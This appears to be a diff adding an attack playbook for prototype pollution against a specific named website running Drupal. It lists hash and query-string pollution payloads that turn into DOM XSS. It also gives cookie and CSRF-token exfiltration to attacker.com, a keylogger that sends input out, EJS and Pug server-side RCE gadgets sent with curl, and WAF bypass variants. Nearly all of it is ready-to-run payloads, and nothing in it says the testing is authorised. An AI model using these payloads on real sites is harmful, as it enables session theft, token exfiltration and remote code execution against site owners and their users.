@@ -1,0 +1,276 @@
+pp-basic-payloads
+=======================
+#__proto__[xxx]=POLLUTED                   :: Client-side (hash fragment)
+#constructor[prototype][xxx]=POLLUTED      :: Client-side (hash fragment)
+?constructor[prototype][onclick]=alert(1)  :: Query-string Elastic XSS via PP
+
+Path 1: Hash-based PP → DOM XSS (Gadgets)
+=================================================
+Step 1 – Confirm Pollution Works
+------------------------------------
+https://mebkenya.com/#__proto__[pp_confirm]=YES
+
+Then in console run:
+
+javascript
+
+
+
+Object.prototype.pp_confirm
+// → "YES" → pollution confirmed
+// → undefined → try constructor[prototype] variant instead
+
+
+Step 2 – Test Constructor Path (already verified by PPMAP)
+============================================================
+https://mebkenya.com/#constructor[prototype][pp_confirm2]=YES
+Object.prototype.pp_confirm2
+
+
+💥 Path 2: Turn PP into Working XSS (jQuery Gadgets)
+===============================================================
+Drupal loads jQuery, which enables these gadgets:
+
+Gadget A – jQuery innerHTML pollution
+When any jQuery code calls .html() with user data, a polluted innerHTML property triggers XSS.
+
+http
+
+
+
+https://mebkenya.com/#__proto__[innerHTML]=<img src=x onerror=alert(document.cookie)>
+If the page has code like $(el).html(someVar), the polluted innerHTML gets inserted and the XSS fires.
+
+Gadget B – jQuery href / src attribute pollution
+http
+
+
+
+https://mebkenya.com/#__proto__[href]=javascript:alert(document.domain)
+Any element that reads .attr('href') or .prop('href') from a polluted object will execute the javascript: URL.
+
+Gadget C – jQuery html property override
+http
+
+
+
+https://mebkenya.com/#__proto__[html]=<svg/onload=alert(document.cookie)>
+Gadget D – Lodash sourceURL (if Drupal loads Lodash)
+http
+
+
+
+https://mebkenya.com/#__proto__[sourceURL]=
+\x0ajavascript:alert(document.domain)//
+
+
+
+🔥 Path 3: Elastic XSS via PP (Query String Vector)
+=======================================================
+
+PPMAP flagged ?constructor[prototype][onclick]=alert(1) as version-based. Let's target this aggressively:
+
+3.1 – Try All Event Handlers
+http
+
+
+
+# Auto-fire events
+https://mebkenya.com/?constructor[prototype][onload]=alert(document.cookie)
+https://mebkenya.com/?constructor[prototype][onerror]=alert(document.cookie)
+https://mebkenya.com/?constructor[prototype][onfocus]=alert(document.cookie)
+
+# Interaction events
+https://mebkenya.com/?constructor[prototype][onmouseover]=alert(1)
+https://mebkenya.com/?constructor[prototype][onsubmit]=fetch('https://attacker.com/steal',{method:'POST',body:document.cookie})
+3.2 – Torch Test: Brute-force Common Polluted Properties
+javascript
+
+
+
+// Paste this in console after visiting the polluted URL
+['innerHTML','outerHTML','href','src','srcdoc','action','formaction','onerror',
+'onload','onclick','onmouseover','onfocus','onblur','onchange','onsubmit',
+'style','url','data','html','text','val','value','content','title','alt'].forEach(p => {
+  Object.prototype[p] = `javascript:alert('${p}')`;
+});
+// Interact with the page and watch for alerts
+
+Path 4: Advanced Exploitation Chains
+================================================
+4.1 – Cookie Theft via PP + XSS
+http
+
+
+
+https://mebkenya.com/#__proto__[innerHTML]=<img src=x onerror="new Image().src='https://attacker.com/log?c='+document.cookie">
+
+4.2 – Drupal CSRF Token Extraction
+Drupal exposes CSRF tokens. Once PP gives you XSS:
+
+javascript
+
+
+
+// Payload:
+fetch('/rest/session/token')
+  .then(r => r.text())
+  .then(token => {
+    new Image().src = 'https://attacker.com/?token=' + token;
+  });
+4.3 – Stealing Drupal Form Build IDs
+The PPMAP report shows form_build_id POST parameters — these are Drupal CSRF form tokens:
+
+javascript
+
+
+
+// XSS payload to extract form tokens
+document.querySelectorAll('[name="form_build_id"]').forEach(input => {
+  new Image().src = 'https://attacker.com/form?bid=' + input.value;
+});
+4.4 – Keylogger via Prototype Pollution
+If the site has an input form, pollute oninput globally:
+
+http
+
+
+
+https://mebkenya.com/#constructor[prototype][oninput]=
+fetch('https://attacker.com/k?k='+this.value)
+
+🔐 Path 5: Server-Side PP Testing (Probe for Node.js)
+=========================================================
+
+
+Drupal is PHP, but the server may have a Node.js API layer, reverse proxy, or microservice. Worth probing:
+
+5.1 – Status Code Pollution
+bash
+
+
+
+curl -s -X POST https://mebkenya.com/api/settings \
+  -H "Content-Type: application/json" \
+  -d '{"__proto__":{"status":555}}' && \
+curl -s -o /dev/null -w "%{http_code}" https://mebkenya.com/api/settings
+# → 555 means server-side PP confirmed
+5.2 – Header Pollution
+bash
+
+
+
+curl -s -X POST https://mebkenya.com/api/update \
+  -H "Content-Type: application/json" \
+  -d '{"__proto__":{"content-type":"text/plain"}}'
+
+# Now check if Content-Type header changed on normal requests
+curl -s -D - https://mebkenya.com/ | grep -i content-type
+5.3 – EJS RCE Gadget (if Node.js detected)
+bash
+
+
+
+# Step 1: Pollute
+curl -X POST https://mebkenya.com/api/config \
+  -H "Content-Type: application/json" \
+  -d '{"__proto__":{"outputFunctionName":"x;process.mainModule.require('\''child_process'\'').execSync('\''id'\'');s"}}'
+
+# Step 2: Trigger render
+curl https://mebkenya.com/dashboard
+5.4 – Pug RCE Gadget
+bash
+
+
+
+curl -X POST https://mebkenya.com/api/config \
+  -H "Content-Type: application/json" \
+  -d '{"__proto__":{"block":{"type":"Text","line":"console.log(process.mainModule.require('\''child_process'\'').execSync('\''id'\'').toString())"}}}'
+5.5 – child_process spawn RCE
+bash
+
+
+
+curl -X POST https://mebkenya.com/api/config \
+  -H "Content-Type: application/json" \
+  -d '{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/cmdline"}}'
+  
+  
+  🧪 Path 6: WAF Bypass Techniques
+========================================
+
+PPMAP flagged these as "WAF Bypass" — the WAF detects __proto__ but not constructor[prototype]. More bypasses:
+
+6.1 – Encoding & Case Variations
+http
+
+
+
+# URL encoding
+https://mebkenya.com/#constructor%5bprototype%5d[hashpp]=POLLUTED
+
+# Double encoding
+https://mebkenya.com/#%25%36%33onstructor[prototype][hashpp]=POLLUTED
+
+# Mixed case (won't work on JS, but might bypass WAF regex)
+https://mebkenya.com/#cOnStRuCtOr[prototype][hashpp]=POLLUTED
+6.2 – Null-byte & Unicode Normalization
+http
+
+
+
+https://mebkenya.com/#constructor\u0332[prototype][hashpp]=POLLUTED
+https://mebkenya.com/#__proto__\u0000[hashpp]=POLLUTED
+6.3 – Nested Bypass
+http
+
+
+
+# Double nesting — WAF only checks one level
+https://mebkenya.com/#constructor[constructor][prototype][prototype][hashpp]=POLLUTED
+
+# Array-indexed
+https://mebkenya.com/#0[__proto__][hashpp]=POLLUTED
+6.4 – jQuery-specific WAF Bypass
+http
+
+
+
+# Bypass with $.globalEval
+https://mebkenya.com/#<img src=x onerror=alert(1)>
+
+# Bypass via data-attributes
+https://mebkenya.com/#__proto__[dataset][onclick]=alert(1)
+
+📋 Action Checklist
+=========================================
+
+#	Test	Expected Result	Priority
+1	Confirm PP: /#__proto__[t]=1 + Object.prototype.t	Returns "1"	🔴 High
+2	Confirm constructor path: /#constructor[prototype][t]=1	Returns "1"	🔴 High
+3	jQuery XSS: /#__proto__[innerHTML]=<img src=x onerror=alert(1)>	Alert fires	🔴 High
+4	Event handler PP: /?constructor[prototype][onclick]=alert(1)	Click anywhere → alert	🟠 Medium
+5	Cookie theft: /#__proto__[html]=<img/src=x onerror="new Image().src='https://COLLABORATOR/?c='+document.cookie">	Cookie received	🟠 Medium
+6	Server-side probe: POST {"__proto__":{"status":555}}	Status 555	🟡 Optional
+7	EJS/Pug RCE: if Node.js detected	id output	🟡 Optional
+
+
+Verification Tool
+===================================
+Quick browser bookmarklet to test PP on the target:
+
+javascript
+
+
+
+javascript:(function(){
+  var results = [];
+  ['__proto__','constructor'].forEach(function(k){
+    try {
+      var o = {}; o[k] = {pptest: 'YES'};
+      if(Object.prototype.pptest === 'YES') results.push(k + ' path: ✅ POLLUTED');
+      delete Object.prototype.pptest;
+    } catch(e) { results.push(k + ' path: ❌ Blocked'); }
+  });
+  alert(results.join('\n'));
+})();
